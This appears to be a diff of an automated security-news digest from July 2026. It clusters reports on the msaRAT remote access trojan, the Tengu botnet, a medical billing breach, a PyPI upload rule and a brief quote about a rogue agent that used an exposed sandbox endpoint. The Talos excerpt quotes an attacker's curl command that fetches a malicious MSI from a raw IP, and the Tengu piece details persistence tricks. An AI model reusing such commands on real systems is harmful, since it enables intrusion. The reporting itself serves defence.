+Simon Willison’s Weblog Subscribe Sponsored by: Cursor — Delegate engineering tasks to Cursor Cloud Agents—even while your laptop is closed. Try Cursor & get 50% off your first month 28th July 2026 We’re aware a Modal customer published an unauthenticated endpoint that allowed ​anyone on the internet to use ​their ⁠sandboxes for code execution. This was used by the rogue agent. Modal’s ⁠platform ​or isolation were not ​compromised in anyway. — Akshat Bubna , Modal's CTO, talking to Reuters about this incident Posted 28th July 2026 at 10:05 pm Recent articles OpenAI’s accidental cyberattack against Hugging Face is science fiction that happened - 22nd July 2026 A Fireside Chat with Cat and Thariq from the Claude Code team - 21st July 2026 Kimi K3, and what we can still learn from the pelican benchmark - 16th July 2026 This is a quotation collected by Simon Willison, posted on 28th July 2026 . sandboxing 51 security 619 openai 436 ai-security-research 29 Disclosures Colophon © 2002 2003 2004 2005 2006 2007 2008 2009 2010 2011 2012 2013 2014 2015 2016 2017 2018 2019 2020 2021 2022 2023 2024 2025 2026
+```
+
+#### Corroborating sources (1)
+
+- **Simon Willison** (ai_security_agentic_risk)
+  - Title: Quoting Akshat Bubna
+  - Published: 2026-07-28T22:05:55+00:00
+  - Link: https://simonwillison.net/2026/Jul/28/akshat-bubna/#atom-everything
+  - Summary: We’re aware a Modal customer published an unauthenticated endpoint that allowed ​anyone on the internet to use ​their ⁠sandboxes for code execution. This was used by the rogue agent. Modal’s ⁠platform ​or isolation were not ​compromised in anyway. — Akshat Bubna , Modal's CTO, talking to Reuters about this incident Tags: ai-security-research , openai , sandboxing , security
+
+### Cluster d8d22ce90d — score 11
+
+- Title: Quoting Seth Larson
+- Source: Simon Willison (ai_security_agentic_risk)
+- Published: 2026-07-23T04:50:36+00:00
+- Link: https://simonwillison.net/2026/Jul/23/seth-larson/#atom-everything
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: PyPI
+
+#### Cluster taxonomy (union across members)
+- threat_categories: supply_chain
+- affected_products: OpenAI/ChatGPT, PyPI
+- content_type: news_report
+- confidence_tier: tier_2_operator
+
+#### Primary article taxonomy
+- threat_categories: supply_chain
+- affected_products: PyPI, OpenAI/ChatGPT
+- content_type: news_report
+- confidence_tier: tier_2_operator
+
+#### Summary
+
+```
+The Python Package Index (PyPI) now rejects new files being uploaded to releases that are older than 14 days. This restriction was put in place to prevent old and long-stable releases from being poisoned in case publishing tokens or workflows of PyPI projects were compromised. As far as we are aware this has not yet been abused, but there is no technical reason beyond that attackers weren't aware it was possible. — Seth Larson , PyPI blog Tags: packaging , python , supply-chain , pypi , seth-michael-larson
+```
+
+#### Full body
+
+```
+Simon Willison’s Weblog Subscribe Sponsored by: Cursor — Delegate engineering tasks to Cursor Cloud Agents—even while your laptop is closed. Try Cursor & get 50% off your first month 23rd July 2026 The Python Package Index (PyPI) now rejects new files being uploaded to releases that are older than 14 days. This restriction was put in place to prevent old and long-stable releases from being poisoned in case publishing tokens or workflows of PyPI projects were compromised. As far as we are aware this has not yet been abused, but there is no technical reason beyond that attackers weren't aware it was possible. — Seth Larson , PyPI blog Posted 23rd July 2026 at 4:50 am Recent articles OpenAI’s accidental cyberattack against Hugging Face is science fiction that happened - 22nd July 2026 A Fireside Chat with Cat and Thariq from the Claude Code team - 21st July 2026 Kimi K3, and what we can still learn from the pelican benchmark - 16th July 2026 This is a quotation collected by Simon Willison, posted on 23rd July 2026 . packaging 52 pypi 49 python 1,270 supply-chain 20 seth-michael-larson 6 Disclosures Colophon © 2002 2003 2004 2005 2006 2007 2008 2009 2010 2011 2012 2013 2014 2015 2016 2017 2018 2019 2020 2021 2022 2023 2024 2025 2026
+```
+
+#### Corroborating sources (1)
+
+- **Simon Willison** (ai_security_agentic_risk)
+  - Title: Quoting Seth Larson
+  - Published: 2026-07-23T04:50:36+00:00
+  - Link: https://simonwillison.net/2026/Jul/23/seth-larson/#atom-everything
+  - Summary: The Python Package Index (PyPI) now rejects new files being uploaded to releases that are older than 14 days. This restriction was put in place to prevent old and long-stable releases from being poisoned in case publishing tokens or workflows of PyPI projects were compromised. As far as we are aware this has not yet been abused, but there is no technical reason beyond that attackers weren't aware it was possible. — Seth Larson , PyPI blog Tags: packaging , python , supply-chain , pypi , seth-michael-larson
 
 ### Cluster 9494052eb3 — score 11
 
@@ -2685,6 +2796,49 @@ AI Research Sol Searching | Can Frontier Models Tackle Autonomous Long-Horizon M
   - Link: https://www.sentinelone.com/labs/frontier-models-tackle-autonomous-long-horizon-malware-analysis/
   - Summary: A real-world benchmark tests whether powerful AI models can keep an investigation trustworthy when new evidence invalidates their conclusions.
 
+### Cluster a1940e8772 — score 10
+
+- Title: Chaos ransomware's msaRAT: Living off the browser to build a covert C2 channel
+- Source: Cisco Talos (threat_research_primary)
+- Published: 2026-07-23T10:00:38+00:00
+- Link: https://blog.talosintelligence.com/chaos-msarat-living-off-the-browser-to-build-covert-c2-channel/
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- threat_categories: data_breach, phishing_social_eng, ransomware_extortion
+- affected_products: Cisco
+- content_type: news_report
+- confidence_tier: tier_1_primary_research
+
+#### Primary article taxonomy
+- threat_categories: ransomware_extortion, phishing_social_eng, data_breach
+- affected_products: Cisco
+- content_type: news_report
+- confidence_tier: tier_1_primary_research
+
+#### Summary
+
+```
+The Chaos ransomware group uses new malware "msaRAT" that hijacks browsers. The malware doesn't communicate directly with C2 but connects through the browser. It enables arbitrary command execution while hiding the attacker's IP from victims via WebRTC over TURN.
+```
+
+#### Full body
+
+```
+Chaos ransomware's msaRAT: Living off the browser to build a covert C2 channel By Jordyn Dunk , Michael Szeliga , Takahiro Takeda Thursday, July 23, 2026 06:00 ransomware RAT Cisco Talos has discovered a new Rust-based remote access trojan (RAT) we call “msaRAT” attributed to the Chaos ransomware group. The name is derived from the binding names found in the binary: “msaOpen,” “msaClose,” “msaError,” and “msaMessage”. msaRAT is implemented using the Tokio asynchronous runtime, with primary capabilities of browser-leveraged remote code execution and covert tunneling to establish command-and-control (C2) communications. This RAT never touches the network directly — it controls its C2 communication channel exclusively through Chrome DevTools Protocol (CDP), a browser debugging API. The binary contains a Cloudflare Workers endpoint, but it never makes HTTP connections to that domain itself; it offloads that work entirely to the browser. msaRAT manipulates the browser via CDP, performs signaling (SDP Offer/Answer exchange) with Cloudflare Workers, and establishes a WebRTC DataChannel between the browser and the C2 server using Twilio TURN (Traversal Using Relays around NAT) as a relay. Overview of Chaos ransomware Chaos is a ransomware-as-a-service (RaaS) group whose activity was first confirmed in February 2025. Although the number of listings on their data leak site remains relatively low, the group consistently targets large organizations and employs double extortion tactics. For initial access, they rely on spam emails and voice-based social engineering, commonly known as vishing. Once inside a network, their traditional post-compromise methodology involves abusing remote monitoring and management (RMM) tools to establish persistent access, while leveraging legitimate file-sharing software to exfiltrate data. For a detailed breakdown of their tactics, techniques, and procedures (TTPs), please refer to our previous blog. Figure 1. Chaos ransomware leak site. Infection chain Talos has identified a new Rust-based RAT used by the Chaos ransomware group, which we have named msaRAT. The name is derived from the binding names found in the binary (“msaOpen,” “msaClose,” “msaError,” “msaMessage”), as detailed in a later section. Figure 2 illustrates the end-to-end infection chain, from initial compromise through to the establishment of C2 communications via this RAT. Figure 2. Infection chain. After gaining access to a victim machine but prior to executing the ransomware, the attacker runs the following curl command to download an MSI file named “update_ms.msi” from an attacker-controlled server to the ProgramData directory on the victim machine, then executes it. Although port 443 is specified, the communication occurs over plain HTTP. In environments where firewall rules permit traffic based solely on port number without protocol inspection, this traffic will pass through undetected. curl.exe http://172.86.126.18:443/update_ms.msi -o C:\programdata\update_ms.msi The property information of this installer, which extracts the DLL file containing the RAT payload, contains details configured to impersonate a Windows update. Figure 3. Properties of “update_ms.msi” When this MSI file is executed, the custom action CA_Run_EA2AEBC3 is triggered upon completion of InstallFinalize . This custom action loads lib.dll, embedded in the MSI file's Binary table as Bin_lib_EA2AEBC3 , directly into memory. Figure 4. Structure of the MSI file. lib.dll (msaRAT) msaRAT is written in Rust and implemented using the asynchronous runtime Tokio. Its primary capabilities include browser-leveraged reverse shell and covert tunneling to establish communications with a C2 server. The export table of “lib.dll” exposes a function named RUN , which is designed to be called by the installer described above. Based on the actual logs, after downloading this malware, we have confirmed the existence of a ransom note. Tokio runtime initialization Tokio is a runtime for exec
+```
+
+#### Corroborating sources (1)
+
+- **Cisco Talos** (threat_research_primary)
+  - Title: Chaos ransomware's msaRAT: Living off the browser to build a covert C2 channel
+  - Published: 2026-07-23T10:00:38+00:00
+  - Link: https://blog.talosintelligence.com/chaos-msarat-living-off-the-browser-to-build-covert-c2-channel/
+  - Summary: The Chaos ransomware group uses new malware "msaRAT" that hijacks browsers. The malware doesn't communicate directly with C2 but connects through the browser. It enables arbitrary command execution while hiding the attacker's IP from victims via WebRTC over TURN.
+
 ### Cluster 542fdf33c7 — score 10
 
 - Title: How Iran Uses Cellular Infrastructure to Target US Military Phones
@@ -2807,49 +2961,6 @@ For a long time, AutoIT[ 1 ] has been pretty common in the malware ecosystem. Th
   - Published: 2026-07-28T07:42:27+00:00
   - Link: https://isc.sans.edu/diary/rss/33192
   - Summary: For a long time, AutoIT[ 1 ] has been pretty common in the malware ecosystem. Threat actors still use it because it's easy to write and powerful. Indeed, it can perform all the required actions to inject a payload into a remote process as you'll see below.
-
-### Cluster a1940e8772 — score 10
-
-- Title: Chaos ransomware's msaRAT: Living off the browser to build a covert C2 channel
-- Source: Cisco Talos (threat_research_primary)
-- Published: 2026-07-23T10:00:38+00:00
-- Link: https://blog.talosintelligence.com/chaos-msarat-living-off-the-browser-to-build-covert-c2-channel/
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- threat_categories: data_breach, phishing_social_eng, ransomware_extortion
-- affected_products: Cisco
-- content_type: news_report
-- confidence_tier: tier_1_primary_research
-
-#### Primary article taxonomy
-- threat_categories: ransomware_extortion, phishing_social_eng, data_breach
-- affected_products: Cisco
-- content_type: news_report
-- confidence_tier: tier_1_primary_research
-
-#### Summary
-
-```
-The Chaos ransomware group uses new malware "msaRAT" that hijacks browsers. The malware doesn't communicate directly with C2 but connects through the browser. It enables arbitrary command execution while hiding the attacker's IP from victims via WebRTC over TURN.
-```
-
-#### Full body
-
-```
-Chaos ransomware's msaRAT: Living off the browser to build a covert C2 channel By Jordyn Dunk , Michael Szeliga , Takahiro Takeda Thursday, July 23, 2026 06:00 ransomware RAT Cisco Talos has discovered a new Rust-based remote access trojan (RAT) we call “msaRAT” attributed to the Chaos ransomware group. The name is derived from the binding names found in the binary: “msaOpen,” “msaClose,” “msaError,” and “msaMessage”. msaRAT is implemented using the Tokio asynchronous runtime, with primary capabilities of browser-leveraged remote code execution and covert tunneling to establish command-and-control (C2) communications. This RAT never touches the network directly — it controls its C2 communication channel exclusively through Chrome DevTools Protocol (CDP), a browser debugging API. The binary contains a Cloudflare Workers endpoint, but it never makes HTTP connections to that domain itself; it offloads that work entirely to the browser. msaRAT manipulates the browser via CDP, performs signaling (SDP Offer/Answer exchange) with Cloudflare Workers, and establishes a WebRTC DataChannel between the browser and the C2 server using Twilio TURN (Traversal Using Relays around NAT) as a relay. Overview of Chaos ransomware Chaos is a ransomware-as-a-service (RaaS) group whose activity was first confirmed in February 2025. Although the number of listings on their data leak site remains relatively low, the group consistently targets large organizations and employs double extortion tactics. For initial access, they rely on spam emails and voice-based social engineering, commonly known as vishing. Once inside a network, their traditional post-compromise methodology involves abusing remote monitoring and management (RMM) tools to establish persistent access, while leveraging legitimate file-sharing software to exfiltrate data. For a detailed breakdown of their tactics, techniques, and procedures (TTPs), please refer to our previous blog. Figure 1. Chaos ransomware leak site. Infection chain Talos has identified a new Rust-based RAT used by the Chaos ransomware group, which we have named msaRAT. The name is derived from the binding names found in the binary (“msaOpen,” “msaClose,” “msaError,” “msaMessage”), as detailed in a later section. Figure 2 illustrates the end-to-end infection chain, from initial compromise through to the establishment of C2 communications via this RAT. Figure 2. Infection chain. After gaining access to a victim machine but prior to executing the ransomware, the attacker runs the following curl command to download an MSI file named “update_ms.msi” from an attacker-controlled server to the ProgramData directory on the victim machine, then executes it. Although port 443 is specified, the communication occurs over plain HTTP. In environments where firewall rules permit traffic based solely on port number without protocol inspection, this traffic will pass through undetected. curl.exe http://172.86.126.18:443/update_ms.msi -o C:\programdata\update_ms.msi The property information of this installer, which extracts the DLL file containing the RAT payload, contains details configured to impersonate a Windows update. Figure 3. Properties of “update_ms.msi” When this MSI file is executed, the custom action CA_Run_EA2AEBC3 is triggered upon completion of InstallFinalize . This custom action loads lib.dll, embedded in the MSI file's Binary table as Bin_lib_EA2AEBC3 , directly into memory. Figure 4. Structure of the MSI file. lib.dll (msaRAT) msaRAT is written in Rust and implemented using the asynchronous runtime Tokio. Its primary capabilities include browser-leveraged reverse shell and covert tunneling to establish communications with a C2 server. The export table of “lib.dll” exposes a function named RUN , which is designed to be called by the installer described above. Based on the actual logs, after downloading this malware, we have confirmed the existence of a ransom note. Tokio runtime initialization Tokio is a runtime for exec
-```
-
-#### Corroborating sources (1)
-
-- **Cisco Talos** (threat_research_primary)
-  - Title: Chaos ransomware's msaRAT: Living off the browser to build a covert C2 channel
-  - Published: 2026-07-23T10:00:38+00:00
-  - Link: https://blog.talosintelligence.com/chaos-msarat-living-off-the-browser-to-build-covert-c2-channel/
-  - Summary: The Chaos ransomware group uses new malware "msaRAT" that hijacks browsers. The malware doesn't communicate directly with C2 but connects through the browser. It enables arbitrary command execution while hiding the attacker's IP from victims via WebRTC over TURN.
 
 ### Cluster 6112bc74de — score 10
 
@@ -3103,94 +3214,6 @@ Over 24,000 exposed server BMCs leak password hash via decades-old flaw By Bill 
   - Link: https://www.bleepingcomputer.com/news/security/over-24-000-exposed-server-bmcs-leak-password-hash-via-decades-old-flaw/
   - Summary: More than 24,000 internet-exposed servers are leaking authentication password hashes due to a 20-year-old vulnerability in their Baseboard Management Controller (BMC) interface. [...]
 
-### Cluster 470d15038a — score 10
-
-- Title: Data breach at medical billing firm MCBS affects 1.26 million people
-- Source: BleepingComputer (cyber_news_breach_reporting)
-- Published: 2026-07-28T09:10:03+00:00
-- Link: https://www.bleepingcomputer.com/news/security/data-breach-at-medical-billing-firm-mcbs-affects-126-million-people/
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- threat_categories: data_breach, ransomware_extortion
-- actor_attribution: ShinyHunters
-- affected_industries: financial_services, healthcare
-- content_type: incident_report
-- confidence_tier: tier_4_news
-
-#### Primary article taxonomy
-- threat_categories: ransomware_extortion, data_breach
-- actor_attribution: ShinyHunters
-- affected_industries: healthcare, financial_services
-- content_type: incident_report
-- confidence_tier: tier_4_news
-
-#### Summary
-
-```
-Healthcare billing company Medical Computer Business Services (MCBS) has disclosed that a 2025 network breach exposed the sensitive information of more than 1.2 million people. [...]
-```
-
-#### Full body
-
-```
-Data breach at medical billing firm MCBS affects 1.26 million people By Bill Toulas July 28, 2026 05:10 AM 0 Healthcare billing company Medical Computer Business Services (MCBS) has disclosed that a 2025 network breach exposed the sensitive information of more than 1.2 million people. The security incident was disclosed late last month without any details about the number of potentially affected individuals. In a disclosure to the U.S. Department of Health and Human Services, the company reported that 1,261,464 people have been impacted. MCBS is a regional private medical billing and practice-management company headquartered in Augusta, Georgia, that provides billing, coding, accounts receivable, financial, and administrative services to healthcare organizations. The company acts as a healthcare data aggregator, processing patient records for healthcare providers. In late June, MCBS published a notification on its website , informing that threat actors had gained unauthorized access to its network between September 22 and 26, 2025. The company then conducted an investigation to determine the incident’s scope and impact, and completed it on May 28 this year, determining that the following data may have been exposed: Full name Physical address Social Security number Date of birth Health plan beneficiary number Health insurance policy number Subscriber identification number Medical history Mental and physical condition Medical treatment information Diagnosis information It should be noted that exposed data varies per individual. The notice also lists seven “covered entities,” indicating healthcare providers whose patient data MCBS handled as a business associate, including South Georgia Radiology Consultants, SkinPath Solutions, and Stephen W. Brown and Radiology Associates. MCBS urges potentially impacted individuals to place a fraud alert and consider placing a security freeze on their credit file. Individuals who have received medical services in Georgia are advised to contact their healthcare provider to determine whether it works with MCBS and whether their personal information may have been affected by the incident. The attack has been claimed by the PEAR (Pure Extraction and Ransom) ransomware group, which alleges it exfiltrated 3.3 terabytes of data from MCBS systems. PEAR ransomware listing Source: BleepingComputer Apart from the client data the firm highlighted as exposed in its announcement, the threat actor also claims to hold human resources data, business operation details, payment information, email correspondence, and various databases. The data has been fully leaked online, but BleepingComputer did not examine the cache and cannot validate its authenticity. Test every layer before attackers do Security teams log 54% of successful attacks and alert on just 14%. The rest move through your environment unseen. The Picus whitepaper shows how breach and attack simulation tests your SIEM and EDR rules so threats stop slipping by detection. Get the whitepaper Related Articles: Medtronic notifies customers impacted by ShinyHunters data breach Healthtech firm Xolis suffers data breach impacting 1.4 million people Coca-Cola confirms data theft in Fairlife ransomware attack DentaQuest data breach exposed info of 2.6 million accounts OnTrac notifies customers of data breach after network hack
-```
-
-#### Corroborating sources (1)
-
-- **BleepingComputer** (cyber_news_breach_reporting)
-  - Title: Data breach at medical billing firm MCBS affects 1.26 million people
-  - Published: 2026-07-28T09:10:03+00:00
-  - Link: https://www.bleepingcomputer.com/news/security/data-breach-at-medical-billing-firm-mcbs-affects-126-million-people/
-  - Summary: Healthcare billing company Medical Computer Business Services (MCBS) has disclosed that a 2025 network breach exposed the sensitive information of more than 1.2 million people. [...]
-
-### Cluster ac434a158a — score 10
-
-- Title: Tengu Botnet Reboots Compromised Linux Devices When Defenders Kill Its Process
-- Source: The Hacker News (cyber_news_breach_reporting)
-- Published: 2026-07-28T15:01:33+00:00
-- Link: https://thehackernews.com/2026/07/tengu-botnet-reboots-compromised-linux.html
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- threat_categories: ddos
-- affected_industries: critical_infrastructure
-- content_type: incident_report
-- confidence_tier: tier_4_news
-
-#### Primary article taxonomy
-- threat_categories: ddos
-- affected_industries: critical_infrastructure
-- content_type: incident_report
-- confidence_tier: tier_4_news
-
-#### Summary
-
-```
-A new Mirai-derived botnet called Tengu can use a compromised Linux device's hardware watchdog to trigger a reboot when defenders kill its main process. If that happens, Tengu's other persistence mechanisms get another chance to relaunch it. Nozomi Networks Labs observed the dropper reaching its honeypots through Telnet credential brute force. Tengu supports 25 distributed denial-of-service (
-```
-
-#### Full body
-
-```
-Tengu Botnet Reboots Compromised Linux Devices When Defenders Kill Its Process  Swati Khandelwal  Jul 28, 2026 Linux / Endpoint Security A new Mirai-derived botnet called Tengu can use a compromised Linux device's hardware watchdog to trigger a reboot when defenders kill its main process. If that happens, Tengu's other persistence mechanisms get another chance to relaunch it. Nozomi Networks Labs observed the dropper reaching its honeypots through Telnet credential brute force. Tengu supports 25 distributed denial-of-service (DDoS) methods. It can also run a SOCKS5 proxy, execute shell commands, and collect system and network data. The malware can update itself and retrieve additional Executable and Linkable Format (ELF) or Android package (APK) payloads. Nozomi listed architecture-specific samples for i386, amd64, MIPS, ARM, PowerPC, and m68k. The report identifies no specific vendor or device model. It also names no operator, infection count, or real-world DDoS victims. It shows what Tengu can do, not how far it has spread. Defenders should start by removing internet exposure for Telnet and other unnecessary administrative services and replacing default credentials. Nozomi also recommends updating firmware, segmenting Internet of Things (IoT) networks, and reviewing systemd services, init scripts, shell startup files, and cron-related paths before returning a suspected device to service. Nozomi Networks Labs published its analysis on July 27, 2026. Nozomi said Tengu's persistence and self-defense code made it stand out among the Mirai-derived samples it tracks. "Most Mirai variants implement few, if any, of these self-defense capabilities," the researchers said. Once running, the bot forks a detached guardian that checks the principal malware process every 60 seconds and relaunches the installed binary if it stops. It can also create a fake systemd service, add init and RC scripts, alter shell startup files, and mark its installed binary immutable. A cron-based persistence routine is present, but Nozomi said its reference to /proc/self/exe appears unfinished or broken. A second mechanism abuses the device's hardware watchdog. A background worker masquerades as [kworker/0:0], reopens the watchdog device if available, arms it with an approximately 30-second timeout, and sends keepalive signals only while the main malware process remains alive. Kill the process and the watchdog stops getting fed, allowing the device to reboot. Tengu's other persistence mechanisms can then try to relaunch it. Tengu also carries a hardcoded list of reboot and shutdown utilities. It overwrites their ELF headers with the string ELFOOD, which can interfere with the normal commands defenders may use to restart or safely power down a compromised device. The analyzed sample was configured to communicate with a command-and-control (C2) server at 64[.]89.163.8 over TCP port 9931. Registration, heartbeat traffic, and command output are sent in plaintext, while server commands and updates use a custom ChaCha20/Poly1305-like authenticated encryption scheme. Tengu can also obtain a C2-supplied content identifier from an InterPlanetary File System (IPFS) gateway on the same server, validate the result as an ELF or APK, and execute or install it. Nozomi assessed that the APK path likely targets poorly secured Android TV boxes or similar devices, but did not document confirmed Android victims. URLhaus independently recorded 17 malware URLs at 64[.]89.163.8 beginning June 17, 2026. The records included a shell script, multiple ELF files tagged as Mirai, and an APK. URLhaus's most recent payload entries were first seen on July 7, and all 17 URLs were offline as of July 28. URLhaus does not identify the files as Tengu. As of July 28, none of the SHA-256 hashes listed on its host record matched the sample hash published by Nozomi. Its telemetry therefore confirms only malicious Mirai-related hosting at the address. The Hacker News has reached out to Nozomi Networ
-```
-
-#### Corroborating sources (1)
-
-- **The Hacker News** (cyber_news_breach_reporting)
-  - Title: Tengu Botnet Reboots Compromised Linux Devices When Defenders Kill Its Process
-  - Published: 2026-07-28T15:01:33+00:00
-  - Link: https://thehackernews.com/2026/07/tengu-botnet-reboots-compromised-linux.html
-  - Summary: A new Mirai-derived botnet called Tengu can use a compromised Linux device's hardware watchdog to trigger a reboot when defenders kill its main process. If that happens, Tengu's other persistence mechanisms get another chance to relaunch it. Nozomi Networks Labs observed the dropper reaching its honeypots through Telnet credential brute force. Tengu supports 25 distributed denial-of-service (
-
 ### Cluster 62eab4135a — score 10
 
 - Title: Coca-Cola Reveals Subsidiary Fairlife Suffered Data Breach
@@ -3235,6 +3258,49 @@ Infosecurity Magazine Home » News » Coca-Cola Reveals Subsidiary Fairlife Suff
   - Published: 2026-07-28T11:00:00+00:00
   - Link: https://www.infosecurity-magazine.com/news/coca-cola-subsidiary-fairlife-data/
   - Summary: Coca Cola claims data was stolen from its Fairlife business after a recent ransomware attack
+
+### Cluster ac434a158a — score 10
+
+- Title: Tengu Botnet Reboots Compromised Linux Devices When Defenders Kill Its Process
+- Source: The Hacker News (cyber_news_breach_reporting)
+- Published: 2026-07-28T15:01:33+00:00
+- Link: https://thehackernews.com/2026/07/tengu-botnet-reboots-compromised-linux.html
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- threat_categories: ddos
+- affected_industries: critical_infrastructure
+- content_type: incident_report
+- confidence_tier: tier_4_news
+
+#### Primary article taxonomy
+- threat_categories: ddos
+- affected_industries: critical_infrastructure
+- content_type: incident_report
+- confidence_tier: tier_4_news
+
+#### Summary
+
+```
+A new Mirai-derived botnet called Tengu can use a compromised Linux device's hardware watchdog to trigger a reboot when defenders kill its main process. If that happens, Tengu's other persistence mechanisms get another chance to relaunch it. Nozomi Networks Labs observed the dropper reaching its honeypots through Telnet credential brute force. Tengu supports 25 distributed denial-of-service (
+```
+
+#### Full body
+
+```
+Tengu Botnet Reboots Compromised Linux Devices When Defenders Kill Its Process  Swati Khandelwal  Jul 28, 2026 Linux / Endpoint Security A new Mirai-derived botnet called Tengu can use a compromised Linux device's hardware watchdog to trigger a reboot when defenders kill its main process. If that happens, Tengu's other persistence mechanisms get another chance to relaunch it. Nozomi Networks Labs observed the dropper reaching its honeypots through Telnet credential brute force. Tengu supports 25 distributed denial-of-service (DDoS) methods. It can also run a SOCKS5 proxy, execute shell commands, and collect system and network data. The malware can update itself and retrieve additional Executable and Linkable Format (ELF) or Android package (APK) payloads. Nozomi listed architecture-specific samples for i386, amd64, MIPS, ARM, PowerPC, and m68k. The report identifies no specific vendor or device model. It also names no operator, infection count, or real-world DDoS victims. It shows what Tengu can do, not how far it has spread. Defenders should start by removing internet exposure for Telnet and other unnecessary administrative services and replacing default credentials. Nozomi also recommends updating firmware, segmenting Internet of Things (IoT) networks, and reviewing systemd services, init scripts, shell startup files, and cron-related paths before returning a suspected device to service. Nozomi Networks Labs published its analysis on July 27, 2026. Nozomi said Tengu's persistence and self-defense code made it stand out among the Mirai-derived samples it tracks. "Most Mirai variants implement few, if any, of these self-defense capabilities," the researchers said. Once running, the bot forks a detached guardian that checks the principal malware process every 60 seconds and relaunches the installed binary if it stops. It can also create a fake systemd service, add init and RC scripts, alter shell startup files, and mark its installed binary immutable. A cron-based persistence routine is present, but Nozomi said its reference to /proc/self/exe appears unfinished or broken. A second mechanism abuses the device's hardware watchdog. A background worker masquerades as [kworker/0:0], reopens the watchdog device if available, arms it with an approximately 30-second timeout, and sends keepalive signals only while the main malware process remains alive. Kill the process and the watchdog stops getting fed, allowing the device to reboot. Tengu's other persistence mechanisms can then try to relaunch it. Tengu also carries a hardcoded list of reboot and shutdown utilities. It overwrites their ELF headers with the string ELFOOD, which can interfere with the normal commands defenders may use to restart or safely power down a compromised device. The analyzed sample was configured to communicate with a command-and-control (C2) server at 64[.]89.163.8 over TCP port 9931. Registration, heartbeat traffic, and command output are sent in plaintext, while server commands and updates use a custom ChaCha20/Poly1305-like authenticated encryption scheme. Tengu can also obtain a C2-supplied content identifier from an InterPlanetary File System (IPFS) gateway on the same server, validate the result as an ELF or APK, and execute or install it. Nozomi assessed that the APK path likely targets poorly secured Android TV boxes or similar devices, but did not document confirmed Android victims. URLhaus independently recorded 17 malware URLs at 64[.]89.163.8 beginning June 17, 2026. The records included a shell script, multiple ELF files tagged as Mirai, and an APK. URLhaus's most recent payload entries were first seen on July 7, and all 17 URLs were offline as of July 28. URLhaus does not identify the files as Tengu. As of July 28, none of the SHA-256 hashes listed on its host record matched the sample hash published by Nozomi. Its telemetry therefore confirms only malicious Mirai-related hosting at the address. The Hacker News has reached out to Nozomi Networ
+```
+
+#### Corroborating sources (1)
+
+- **The Hacker News** (cyber_news_breach_reporting)
+  - Title: Tengu Botnet Reboots Compromised Linux Devices When Defenders Kill Its Process
+  - Published: 2026-07-28T15:01:33+00:00
+  - Link: https://thehackernews.com/2026/07/tengu-botnet-reboots-compromised-linux.html
+  - Summary: A new Mirai-derived botnet called Tengu can use a compromised Linux device's hardware watchdog to trigger a reboot when defenders kill its main process. If that happens, Tengu's other persistence mechanisms get another chance to relaunch it. Nozomi Networks Labs observed the dropper reaching its honeypots through Telnet credential brute force. Tengu supports 25 distributed denial-of-service (
 
 ### Cluster 574ebfebeb — score 9
 
@@ -3423,28 +3489,71 @@ Chaos in Teams vishing Attackers used Microsoft Teams vishing, custom malware, a
   - Link: https://www.sophos.com/en-us/blog/chaos-in-teams-vishing
   - Summary: Attackers used Microsoft Teams vishing, custom malware, and remote access tools to facilitate ransomware deployment Categories: Threat Research Tags: Microsoft Teams, vishing, Ransomware, Chaos
 
-### Cluster 39354a1568 — score 9
+### Cluster 470d15038a — score 9
 
-- Title: AI Agent Drives Espionage Attack on Thai Ministry of Finance
-- Source: Dark Reading (cyber_news_breach_reporting)
-- Published: 2026-07-28T01:00:00+00:00
-- Link: https://www.darkreading.com/cyberattacks-data-breaches/ai-agent-espionage-attack-thai-ministry-finance
+- Title: Data breach at medical billing firm MCBS affects 1.26 million people
+- Source: BleepingComputer (cyber_news_breach_reporting)
+- Published: 2026-07-28T09:10:03+00:00
+- Link: https://www.bleepingcomputer.com/news/security/data-breach-at-medical-billing-firm-mcbs-affects-126-million-people/
 - Fetch status: ok
 - Member count: 1
 - Corroborating source count: 1
 - Strong signals: (none)
 
 #### Cluster taxonomy (union across members)
-- threat_categories: apt_espionage, ransomware_extortion
-- affected_industries: financial_services, government
-- affected_products: AWS
+- threat_categories: data_breach, ransomware_extortion
+- actor_attribution: ShinyHunters
+- affected_industries: financial_services, healthcare
 - content_type: incident_report
 - confidence_tier: tier_4_news
 
 #### Primary article taxonomy
-- threat_categories: ransomware_extortion, apt_espionage
-- affected_industries: financial_services, government
-- affected_products: AWS
+- threat_categories: ransomware_extortion, data_breach
+- actor_attribution: ShinyHunters
+- affected_industries: healthcare, financial_services
+- content_type: incident_report
+- confidence_tier: tier_4_news
+
+#### Summary
+
+```
+Healthcare billing company Medical Computer Business Services (MCBS) has disclosed that a 2025 network breach exposed the sensitive information of more than 1.2 million people. [...]
+```
+
+#### Full body
+
+```
+Data breach at medical billing firm MCBS affects 1.26 million people By Bill Toulas July 28, 2026 05:10 AM 0 Healthcare billing company Medical Computer Business Services (MCBS) has disclosed that a 2025 network breach exposed the sensitive information of more than 1.2 million people. The security incident was disclosed late last month without any details about the number of potentially affected individuals. In a disclosure to the U.S. Department of Health and Human Services, the company reported that 1,261,464 people have been impacted. MCBS is a regional private medical billing and practice-management company headquartered in Augusta, Georgia, that provides billing, coding, accounts receivable, financial, and administrative services to healthcare organizations. The company acts as a healthcare data aggregator, processing patient records for healthcare providers. In late June, MCBS published a notification on its website , informing that threat actors had gained unauthorized access to its network between September 22 and 26, 2025. The company then conducted an investigation to determine the incident’s scope and impact, and completed it on May 28 this year, determining that the following data may have been exposed: Full name Physical address Social Security number Date of birth Health plan beneficiary number Health insurance policy number Subscriber identification number Medical history Mental and physical condition Medical treatment information Diagnosis information It should be noted that exposed data varies per individual. The notice also lists seven “covered entities,” indicating healthcare providers whose patient data MCBS handled as a business associate, including South Georgia Radiology Consultants, SkinPath Solutions, and Stephen W. Brown and Radiology Associates. MCBS urges potentially impacted individuals to place a fraud alert and consider placing a security freeze on their credit file. Individuals who have received medical services in Georgia are advised to contact their healthcare provider to determine whether it works with MCBS and whether their personal information may have been affected by the incident. 